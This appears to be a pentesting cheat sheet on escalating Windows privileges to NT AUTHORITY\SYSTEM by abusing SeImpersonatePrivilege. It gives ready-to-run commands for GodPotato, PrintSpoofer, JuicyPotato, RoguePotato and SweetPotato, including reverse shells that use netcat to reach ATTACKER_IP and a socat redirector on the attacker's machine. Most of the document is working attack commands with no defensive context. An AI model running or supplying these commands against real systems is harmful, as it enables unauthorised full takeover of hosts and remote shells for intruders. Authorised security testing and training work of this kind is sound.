`SeImpersonatePrivilege` is a Windows privilege that allows a process to **impersonate the security context of another user after authentication**. This means a process can execute actions using another user’s security token once authentication has occurred.

This privilege is commonly granted to:

- Service accounts
    
- IIS application pools
    
- SQL Server services
    
- Scheduled task services
    

If a low‑privileged user has `SeImpersonatePrivilege`, an attacker can exploit **Windows token impersonation mechanisms** to escalate privileges to **NT AUTHORITY\SYSTEM**.

---

## Checking if SeImpersonatePrivilege is Enabled
Execute:
```
whoami /priv
```

Example output:

```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
```


---

## Exploitation Methods

### GodPotato (Modern Windows)

`GodPotato` works on many **modern Windows versions**, including:

- Windows Server 2019
    
- Windows Server 2022
    
- Windows 10
    
- Windows 11
    

It abuses **DCOM activation and token impersonation** to obtain a SYSTEM token.

**Execute command as SYSTEM:**

```
GodPotato.exe -cmd "cmd /c whoami"
```

**Spawn interactive shell:**

```
GodPotato.exe -cmd "cmd"
```

**Spawn PowerShell:**

```
GodPotato.exe -cmd "powershell"
```

**Reverse shell example:**

```
GodPotato.exe -cmd "nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### PrintSpoofer

Works on many **Windows 10 and Windows Server builds** by abusing the **Print Spooler service**.

**Execute:**

```
PrintSpoofer.exe -i -c cmd
```

**Spawn PowerShell:**

```
PrintSpoofer.exe -i -c powershell
```

### JuicyPotato

Works on **older Windows systems**.

Supported examples:

- Windows Server 2016
    
- Older Windows 10 builds
    

It abuses **COM service activation** using a SYSTEM service CLSID.

**Basic syntax:**

```
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

Example CLSID:

```
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Reverse shell example:

```
JuicyPotato.exe -l 1337 -p nc.exe -t * -c {CLSID} -a "ATTACKER_IP 4444 -e cmd.exe"
```


### RoguePotato

Used when **JuicyPotato is patched**.

Requires a **redirector on the attacker machine**.

**Attacker machine:**

```
socat tcp-listen:135,fork tcp:TARGET_IP:9999
```

**Target machine:**

```
RoguePotato.exe -r ATTACKER_IP -e cmd.exe -l 9999
```

Result:

```
NT AUTHORITY\SYSTEM shell
```


### SweetPotato

SweetPotato integrates several token impersonation techniques.

**Execute command:**

```
SweetPotato.exe -p cmd.exe
```

Spawn PowerShell:

```
SweetPotato.exe -p powershell.exe
```

